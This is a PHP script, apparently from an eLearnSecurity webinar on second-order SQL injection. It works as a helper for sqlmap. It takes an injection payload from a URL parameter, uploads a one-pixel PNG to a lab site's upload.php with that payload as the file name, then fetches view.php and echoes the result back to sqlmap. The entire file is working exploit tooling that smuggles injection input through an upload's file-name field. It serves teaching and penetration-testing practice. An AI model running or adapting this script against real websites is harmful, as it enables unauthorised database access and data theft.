<?php

// from elearnsecurity second order webinar

###################################################
#                                                 #
#    Second Order SQLi Webinar - Configuration    #
#                                                 #
###################################################
// 1px PNG "Selfie"
$img = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAA1BMVEX///+nxBvIAAAACXBIWXMA
AAsTAAALEwEAmpwYAAAAB3RJTUUH3gkaCCkAnAHMJgAAABl0RVh0Q29tbWVudABDcmVhdGVkIHdp
dGggR0lNUFeBDhcAAAAKSURBVAjXY2AAAAACAAHiIbwzAAAAAElFTkSuQmCC';

// File name AKA our SQLi payload
$payload = $_GET['payload'];

// Page to upload (POST) $img
$injectionURL = 'http://selfie4you.site/upload.php';

// Page with the results of the SQLi (GET)
$resultsURL = "http://selfie4you.site/view.php?file=".urlencode($payload);

################################################################################
#                                                                              #
#   We have to build a custom HTTP post request with our payload as filename   #
#               (Form-based File Upload in HTML - RFC1867)                     #
#                                                                              #
################################################################################

// Boundary for the multipart POST
$boundary = "---------------------" . md5(mt_rand() . microtime());

// POST body
$body = Array();

// The POST data and body, our $img
$data = base64_decode($img);
$imgpost = Array (
    "--{$boundary}",
    "Content-Disposition: form-data; name=\"file\"; filename=\"$payload\"",
    "Content-Type: image/png",
    "",
    $data
);
$body[] = implode("\r\n", $imgpost);
$body[] = "--{$boundary}--";
$body[] = "";

$postbody = implode("\r\n", $body);

// POST HEADERS
$headers = array(
        "Expect: 100-continue",
        "Content-Type: multipart/form-data; boundary={$boundary}", // change Content-Type
    );

#######################################
#                                     #
#    Let us POST it using PHP CURL    #
#                                     #
#######################################
// CURL Handler
$ch = curl_init();
// CURL options
// Set CURL to POST
curl_setopt($ch, CURLOPT_POST, true);
// CURL POST URL
curl_setopt($ch, CURLOPT_URL, $injectionURL);
// We do not want to reflect the output of the POST to sqlmap
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// Headers
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
// Body
curl_setopt($ch, CURLOPT_POSTFIELDS, $postbody);

// Do the actual POST
$result = curl_exec($ch);
curl_close($ch);

######################################################################
#                                                                    #
#    And now let us reflect the result of the injection to sqlmap    #
#                                                                    #
######################################################################
$injectionresponse = file_get_contents($resultsURL);
echo $injectionresponse;
?>
